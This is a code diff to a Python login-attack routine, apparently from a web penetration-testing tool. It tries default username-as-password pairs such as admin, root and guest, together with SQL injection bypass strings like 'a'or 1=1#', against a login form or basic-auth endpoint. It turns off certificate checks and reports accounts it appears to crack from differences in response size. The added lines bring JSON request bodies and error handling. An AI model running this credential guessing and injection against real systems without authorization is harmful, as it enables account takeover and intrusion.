@@ -2,6 +2,7 @@ import requests
 import argparse
 import sys, os, re
 import time
+import json
 
 from config.color_config import INFO, found, not_found, action_not_found, action_found
 
@@ -12,37 +13,43 @@ UserAgent = {'User-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJ
 
 class all_default_tests:
 
-    def default_user_as_pass(self, url, username_input=False, password_input=False, fc=False, nomessage=False, basic=False, cookie_=False):
+    def default_user_as_pass(self, url, username_input=False, password_input=False, fc=False, nomessage=False, basic=False, cookie_=False, req_type=False):
         payl = ["admin", "adm" "administrateur", "administrator", "monitor", "webadmin", "test", "info", "root", "guest", 
                 "anonymous", "demo", "manager", "user", "dev", "a'or 1=1#", "a'or 1=1 or'"]
 
         account_found = False
         for p in payl:
             login = {username_input: p, password_input: p}
-            req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10, headers=UserAgent, cookies=cookie_) if not basic else requests.post(url, auth=(p, p), verify=False, allow_redirects=False, timeout=10, headers=UserAgent)
+            if req_type == "json":
+                login = json.dumps(login)
+            try:
+                req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10, headers=UserAgent, cookies=cookie_) if not basic else requests.post(url, auth=(p, p), verify=False, allow_redirects=False, timeout=10, headers=UserAgent)
             
-            if type(fc) != int:
-                if len(req.text) != fc[0] and len(req.text) != fc[1] and req.status_code not in [401, 403]:
-                    print("  {}Potentially account or username found: {}:{}".format(found, p, p))
-                    account_found = True
-                elif nomessage and nomessage not in req.text:
-                    print("  {}Potentially account or username found: {}:{} [{}b]".format(found, p, p, len(req.content)))
-                    account_found = True
-            else:
-                if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403]:
-                    print("  {}Potentially account or username found: {}:{}".format(found, p, p))
-                    account_found = True
-                elif nomessage and nomessage not in req.text:
-                    print("  {}Potentially account or username found: {}:{} [{}b]".format(found, p, p, len(req.content)))
-                    account_found = True
-                elif len(req.text) not in range(fc - 300, fc + 300) and req.status_code not in [401, 403]:
-                    print("  {}Account found: {}:{}".format(found, p, p))
-                    if not urls_file:
-                        sys.exit()
-            
-            #sys.stdout.write("\033[34{}: {} | {}: {}\033[0m\r".format(username_input, p, password_input, p))
-            sys.stdout.write("\033[34{}\033[0m\r".format(login))
-            sys.stdout.write("\033[K")
+                if type(fc) != int:
+                    if len(req.text) != fc[0] and len(req.text) != fc[1] and req.status_code not in [401, 403]:
+                        print("  {}Potentially account or username found: {}:{}".format(found, p, p))
+                        account_found = True
+                    elif nomessage and nomessage not in req.text:
+                        print("  {}Potentially account or username found: {}:{} [{}b]".format(found, p, p, len(req.content)))
+                        account_found = True
+                else:
+                    if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403]:
+                        print("  {}Potentially account or username found: {}:{}".format(found, p, p))
+                        account_found = True
+                    elif nomessage and nomessage not in req.text:
+                        print("  {}Potentially account or username found: {}:{} [{}b]".format(found, p, p, len(req.content)))
+                        account_found = True
+                    elif len(req.text) not in range(fc - 300, fc + 300) and req.status_code not in [401, 403]:
+                        print("  {}Account found: {}:{}".format(found, p, p))
+                        if not urls_file:
+                            sys.exit()
+                
+                #sys.stdout.write("\033[34{}: {} | {}: {}\033[0m\r".format(username_input, p, password_input, p))
+                sys.stdout.write("\033[34{}\033[0m\r".format(login))
+                sys.stdout.write("\033[K")
+            except:
+                print("Error with: {}".format(login))
+                pass
         return account_found
 
 
@@ -77,7 +84,8 @@ class all_default_tests:
             fc = len(fc_r.content)
 
 
-        users = ["admin", "adm", "administrateur", "administrator", "monitor", "webadmin", "test", "root", "guest", "anonymous", "demo", "manager", "user", "info", domain] if not user_known else [user_known]
+        users = ["admin", "adm" "administrateur", "administrator", "monitor", "webadmin", "test", "info", "root", "guest", 
+                "anonymous", "demo", "manager", "user", "dev", domain] if not user_known else [user_known]
 
         dico_user_reuse = [
         "{}".format(domain), "{}@".format(domain),
